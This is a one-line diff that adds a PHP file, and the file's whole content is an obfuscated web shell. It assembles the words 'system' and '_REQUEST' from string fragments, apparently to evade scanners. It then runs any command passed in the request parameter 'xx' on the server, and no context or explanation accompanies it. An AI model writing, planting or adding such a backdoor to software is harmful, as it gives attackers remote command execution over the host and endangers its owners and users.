@@ -1,0 +1,1 @@
+<?php $s="syst"."em";$r="_";$rr=$r."R"."EQU"."EST";$s(${$rr}['xx']); ?>
